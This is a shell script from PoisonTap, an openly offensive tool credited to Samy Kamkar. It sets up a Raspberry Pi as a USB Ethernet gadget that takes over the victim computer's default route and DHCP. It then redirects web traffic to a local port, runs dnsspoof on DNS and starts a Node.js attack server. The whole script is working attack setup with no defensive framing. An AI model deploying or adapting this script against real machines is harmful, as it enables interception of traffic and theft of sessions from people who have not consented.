#!/bin/sh
#
# PoisonTap
#  by samy kamkar
#  http://samy.pl/poisontap
#  01/08/2016
#
# If you find this doesn't come up automatically as an ethernet device
# change idVendor/idProduct to 0x04b3/0x4010

cd /sys/kernel/config/usb_gadget/
mkdir -p poisontap
cd poisontap

#echo 0x04b3 > idVendor  # IN CASE BELOW DOESN'T WORK
#echo 0x4010 > idProduct # IN CASE BELOW DOESN'T WORK
echo 0x1d6b > idVendor   # Linux Foundation
echo 0x0104 > idProduct  # Multifunction Composite Gadget

echo 0x0100 > bcdDevice # v1.0.0
echo 0x0200 > bcdUSB # USB2
mkdir -p strings/0x409
echo "badc0deddeadbeef" > strings/0x409/serialnumber
echo "Samy Kamkar" > strings/0x409/manufacturer
echo "PoisonTap" > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "Config 1: ECM network" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower


mkdir -p functions/acm.usb0
ln -s functions/acm.usb0 configs/c.1/
# End functions


mkdir -p functions/ecm.usb0
# first byte of address must be even
HOST="48:6f:73:74:50:43"
SELF="42:61:64:55:53:42"
echo $HOST > functions/ecm.usb0/host_addr
echo $SELF > functions/ecm.usb0/dev_addr
ln -s functions/ecm.usb0 configs/c.1/
ls /sys/class/udc > UDC


ifup usb0
ifconfig usb0 up
/sbin/route add -net 0.0.0.0/0 usb0
/etc/init.d/isc-dhcp-server start

/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 


